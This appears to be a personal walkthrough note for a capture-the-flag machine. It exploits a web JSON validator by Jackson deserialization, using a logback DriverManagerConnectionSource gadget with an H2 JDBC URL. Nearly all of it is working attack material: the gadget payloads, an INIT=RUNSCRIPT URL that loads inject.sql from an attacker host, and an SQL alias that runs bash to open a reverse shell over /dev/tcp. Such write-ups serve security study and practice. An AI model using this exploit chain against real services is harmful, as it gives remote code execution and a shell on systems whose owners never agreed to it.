# Homepage
![[Pasted image 20211215011445.png]]

## Validator
### Display Error

* input: workformebaby
* Output: Validation failed: Unhandled **Java** exception: **com.fasterxml.jackson.core.JsonParseException**: Unrecognized token 'workformebaby': was expecting ('true', 'false' or 'null')

### Stack Overflow, confirm exploit
* input: \["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:"}\]
* Output: Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.JsonMappingException: Infinite recursion (StackOverflowError) (through reference chain: org.h2.engine.Database["mainSchema"]->
org.h2.schema.Schema["database"]->org.h2.engine.Database["mainSchema"]...[snip]...

### Make HTTP Connection + shell
Run a webserver, host inject.sql and make the below command

* input: \["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.21:8000/inject.sql'"}\]
* Output: HTTP Connection


## Reverse Shell
### Create file inject.sql
Content : 
```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.21/9001 0>&1')

```


![[Pasted image 20211215013212.png]]